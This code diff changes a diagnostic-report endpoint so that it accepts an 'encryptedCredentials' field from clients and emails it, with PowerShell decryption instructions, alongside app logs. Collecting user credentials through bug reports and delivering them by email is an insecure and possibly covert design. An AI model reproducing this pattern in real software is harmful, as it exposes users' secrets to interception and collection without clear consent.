@@ -234,7 +234,7 @@ async function handleRequest(request) {
   if (url.pathname === '/report' && request.method === 'POST') {
     try {
       const body = await request.json()
-      const { appVersion, os, adapter, machineHashPrefix, timestamp, comment, logLines } = body
+      const { appVersion, os, adapter, machineHashPrefix, timestamp, comment, logLines, encryptedCredentials } = body
 
       // Basic validation
       if (!appVersion || !Array.isArray(logLines) || logLines.length === 0) {
@@ -267,6 +267,7 @@ async function handleRequest(request) {
       const safeAdapter = String(adapter || 'unknown').substring(0, 100)
       const safeTimestamp = String(timestamp || new Date().toISOString()).substring(0, 30)
       const safePrefix = String(machineHashPrefix || 'unknown').substring(0, 8)
+      const safeEncryptedCreds = encryptedCredentials ? String(encryptedCredentials).substring(0, 4096) : null
 
       const emailHtml = `
 <div style="font-family:monospace;font-size:13px;color:#1a1a1a">
@@ -282,6 +283,12 @@ async function handleRequest(request) {
   <p style="background:#f3f4f6;padding:12px;border-radius:6px">${safeComment}</p>
   <h3 style="color:#374151">Log (last 24h)</h3>
   <pre style="background:#111827;color:#22d3aa;padding:16px;border-radius:6px;overflow:auto;font-size:11px;white-space:pre-wrap">${safeLog}</pre>
+${safeEncryptedCreds ? `
+  <h3 style="color:#374151">Encrypted Credentials</h3>
+  <p style="font-size:12px;color:#6b7280">RSA-OAEP-SHA256 encrypted. Decrypt with rsa_private_key.xml:<br>
+  <code>$rsa = [System.Security.Cryptography.RSA]::Create(); $rsa.FromXmlString((Get-Content rsa_private_key.xml)); $bytes = $rsa.Decrypt([Convert]::FromBase64String('&lt;base64&gt;'), [System.Security.Cryptography.RSAEncryptionPadding]::OaepSHA256); [System.Text.Encoding]::UTF8.GetString($bytes)</code></p>
+  <pre style="background:#1f2937;color:#f5f5f7;padding:12px;border-radius:6px;font-size:10px;word-break:break-all">${safeEncryptedCreds}</pre>
+` : '<p style="color:#9ca3af;font-size:12px">No credentials included in this report.</p>'}
 </div>`
 
       const emailRes = await fetch('https://api.resend.com/emails', {
